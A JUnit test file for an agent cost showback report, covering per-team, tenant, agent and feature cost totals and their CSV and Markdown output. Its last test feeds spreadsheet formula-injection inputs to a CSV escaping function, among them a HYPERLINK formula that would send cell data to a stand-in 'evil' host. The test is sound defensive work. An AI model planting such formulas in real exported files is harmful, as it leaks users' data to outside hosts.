package io.vegaduta.agent.core.cost;

import static org.assertj.core.api.Assertions.assertThat;

import io.vegaduta.agent.api.RunContext;
import io.vegaduta.agent.api.tool.ToolStatus;
import java.util.List;
import org.junit.jupiter.api.Test;

class ShowbackReportTest {

  private static final CostModel MODEL =
      CostModel.builder()
          .toolCost("search", "0.010")
          .toolCost("email", "0.100")
          .modelPrice("m1", ModelPrice.perMillion("1.00", "1.00"))
          .humanReviewCost("1.00")
          .build();

  private static RunContext run(String id, String tenant, String agent, String team, String feat) {
    return CostAttribution.tag(
        RunContext.builder().runId(id).tenantId(tenant).agentId(agent).build(), team, feat);
  }

  private static CostLedger ledger() {
    CostLedger ledger = new CostLedger(MODEL);
    RunContext p1 = run("p1", "acme", "refund-bot", "payments", "refunds");
    RunContext p2 = run("p2", "acme", "refund-bot", "payments", "refunds");
    RunContext s1 = run("s1", "acme", "support-bot", "support", "faq");
    RunContext untagged = RunContext.builder().runId("u1").tenantId("globex").build();

    ledger.recordToolCall(p1, "search", ToolStatus.OK);
    ledger.recordToolCall(p1, "email", ToolStatus.OK);
    ledger.recordToolCall(p1, "email", ToolStatus.DENIED);
    ledger.recordModelUsage(p1, "m1", 1_000_000, 1_000_000); // 2.00
    ledger.recordReview(p1, "a-1"); // 1.00
    ledger.recordToolCall(p2, "search", ToolStatus.BUDGET_EXCEEDED);
    ledger.recordToolCall(s1, "search", ToolStatus.OK);
    ledger.recordModelUsage(s1, "m1", 500_000, 0); // 0.50
    ledger.recordToolCall(untagged, "search", ToolStatus.OK);
    return ledger;
  }

  @Test
  void groupsByTeamWithUnitEconomics() {
    ShowbackReport report = ShowbackReport.from(ledger());

    List<ShowbackReport.Row> byTeam = report.byTeam();
    assertThat(byTeam)
        .extracting(ShowbackReport.Row::key)
        .containsExactly("payments", "support", CostAttribution.UNATTRIBUTED);

    ShowbackReport.Row payments = byTeam.get(0);
    assertThat(payments.runs()).isEqualTo(2);
    assertThat(payments.toolCalls()).isEqualTo(4);
    assertThat(payments.totalTokens()).isEqualTo(2_000_000);
    assertThat(payments.toolUsd()).isEqualByComparingTo("0.110");
    assertThat(payments.modelUsd()).isEqualByComparingTo("2.00");
    assertThat(payments.reviewUsd()).isEqualByComparingTo("1.00");
    assertThat(payments.totalUsd()).isEqualByComparingTo("3.110");
    assertThat(payments.usdPerRun()).isEqualByComparingTo("1.555");
    assertThat(payments.denied()).isEqualTo(1);
    assertThat(payments.budgetExceeded()).isEqualTo(1);

    ShowbackReport.Row support = byTeam.get(1);
    assertThat(support.runs()).isEqualTo(1);
    assertThat(support.totalUsd()).isEqualByComparingTo("0.510");
    assertThat(support.usdPerRun()).isEqualByComparingTo("0.510");
  }

  @Test
  void groupsByEveryDimensionAndTotals() {
    ShowbackReport report = ShowbackReport.from(ledger());

    assertThat(report.byTenant())
        .extracting(ShowbackReport.Row::key)
        .containsExactly("acme", "globex");
    assertThat(report.byTenant().get(0).runs()).isEqualTo(3);
    assertThat(report.byAgent())
        .extracting(ShowbackReport.Row::key)
        .containsExactly("refund-bot", "support-bot", CostAttribution.UNATTRIBUTED);
    assertThat(report.byFeature())
        .extracting(ShowbackReport.Row::key)
        .containsExactly("refunds", "faq", CostAttribution.UNATTRIBUTED);

    ShowbackReport.Row total = report.total();
    assertThat(total.runs()).isEqualTo(4);
    assertThat(total.toolCalls()).isEqualTo(6);
    assertThat(total.totalUsd()).isEqualByComparingTo("3.630");
    assertThat(total.usdPerRun()).isEqualByComparingTo("0.9075");
  }

  @Test
  void ranksTopToolsAndRuns() {
    ShowbackReport report = ShowbackReport.from(ledger());

    List<ShowbackReport.ToolTotal> tools = report.topTools(1);
    assertThat(tools).hasSize(1);
    assertThat(tools.get(0).toolName()).isEqualTo("email");
    assertThat(tools.get(0).calls()).isEqualTo(2);
    assertThat(tools.get(0).denied()).isEqualTo(1);
    assertThat(tools.get(0).usd()).isEqualByComparingTo("0.100");
    assertThat(report.topTools(10))
        .extracting(ShowbackReport.ToolTotal::toolName)
        .containsExactly("email", "search");

    List<ShowbackReport.RunTotal> runs = report.topRuns(2);
    assertThat(runs).extracting(ShowbackReport.RunTotal::runId).containsExactly("p1", "s1");
    assertThat(runs.get(0).usd()).isEqualByComparingTo("3.110");
    assertThat(runs.get(0).team()).isEqualTo("payments");
    assertThat(runs.get(0).toolCalls()).isEqualTo(3);
  }

  @Test
  void rendersCsv() {
    String csv = ShowbackReport.from(ledger()).toCsv();
    String[] lines = csv.split("\r\n");

    assertThat(lines[0])
        .isEqualTo(
            "dimension,key,runs,toolCalls,inputTokens,outputTokens,toolUsd,modelUsd,reviewUsd,"
                + "totalUsd,denied,budgetExceeded,usdPerRun");
    assertThat(lines)
        .contains(
            "TEAM,payments,2,4,1000000,1000000,0.110000,2.000000,1.000000,3.110000,1,1,1.555000");
    assertThat(lines[lines.length - 1]).startsWith("TOTAL,total,4,6,");
    // TENANT (2) + AGENT (3) + TEAM (3) + FEATURE (3) + total
    assertThat(lines).hasSize(1 + 2 + 3 + 3 + 3 + 1);
    assertThat(ShowbackReport.csv("a,b")).isEqualTo("\"a,b\"");
    assertThat(ShowbackReport.csv("say \"hi\"")).isEqualTo("\"say \"\"hi\"\"\"");
    assertThat(ShowbackReport.csv("plain")).isEqualTo("plain");
  }

  @Test
  void rendersMarkdown() {
    String md = ShowbackReport.from(ledger()).toMarkdown();

    assertThat(md)
        .startsWith("# Agent cost showback\n\nTotal: 4 runs, 6 tool calls, 2500000 tokens");
    assertThat(md).contains("## By team\n\n| team | runs | tool calls |");
    assertThat(md)
        .contains(
            "| payments | 2 | 4 | 2000000 | 0.110000 | 2.000000 | 1.000000 | 3.110000 | 1.555000"
                + " | 1 | 1 |");
    assertThat(md).contains("## Top tools\n\n| tool | calls | denied | USD |");
    assertThat(md).contains("| email | 2 | 1 | 0.100000 |");
    assertThat(md).contains("## Top runs");
    assertThat(md).contains("| p1 | acme | refund-bot | payments | 3 | 3.110000 |");
  }

  @Test
  void emptyLedgerRendersWithoutDivisionByZero() {
    ShowbackReport report = ShowbackReport.from(new CostLedger(MODEL));
    assertThat(report.total().runs()).isZero();
    assertThat(report.total().usdPerRun()).isEqualByComparingTo("0");
    assertThat(report.byTeam()).isEmpty();
    assertThat(report.topTools(5)).isEmpty();
    assertThat(report.toCsv())
        .endsWith("TOTAL,total,0,0,0,0,0.000000,0.000000,0.000000,0.000000,0,0,0.000000\r\n");
    assertThat(report.toMarkdown()).contains("## Top runs");
  }

  @Test
  void csvCellsCannotBecomeSpreadsheetFormulas() {
    assertThat(ShowbackReport.csv("=HYPERLINK(\"http://evil/\"&A1,\"click\")"))
        .startsWith("\"'=HYPERLINK(");
    assertThat(ShowbackReport.csv("+1")).isEqualTo("\"'+1\"");
    assertThat(ShowbackReport.csv("-1")).isEqualTo("\"'-1\"");
    assertThat(ShowbackReport.csv("@cmd")).isEqualTo("\"'@cmd\"");
    assertThat(ShowbackReport.csv("\tx")).isEqualTo("\"'\tx\"");
    assertThat(ShowbackReport.csv("plain")).isEqualTo("plain");
  }
}
